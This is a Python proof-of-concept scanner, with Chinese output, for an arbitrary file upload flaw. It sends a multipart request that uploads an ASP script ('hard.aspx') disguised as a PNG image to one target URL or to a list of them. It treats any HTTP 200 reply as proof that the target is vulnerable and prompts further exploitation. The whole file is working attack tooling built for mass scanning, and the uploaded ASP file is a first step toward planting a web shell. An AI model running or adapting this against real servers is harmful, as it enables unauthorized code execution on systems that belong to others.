import requests
import argparse

def send_request(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1eBdibB13u",
        "X-Requested-With": "XMLHttpRequest"
    }

    data = """------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="action"

post
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="myPhoto"; filename="hard.aspx"
Content-Type: image/png

<% response.write("123") %>

------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="oldName"


------WebKitFormBoundarywt7cEu1eBdibB13u--"""

    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        print(f"漏洞存在: {url}，请进行后续测试")


def process_url(url):
    print(f"发送请求至 {url}")
    send_request(url)

def process_file(file_path):
    with open(file_path, "r") as file:
        for line in file:
            url = line.strip()
            if url:
                process_url(url)

def main():
    parser = argparse.ArgumentParser(description="发送报文到指定 IP 地址")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="指定单个 URL 发送报文")
    group.add_argument("-f", "--file", help="指定包含 IP 地址的文本文件发送报文")
    args = parser.parse_args()

    if args.url:
        process_url(args.url)
    elif args.file:
        process_file(args.file)

if __name__ == "__main__":
    main()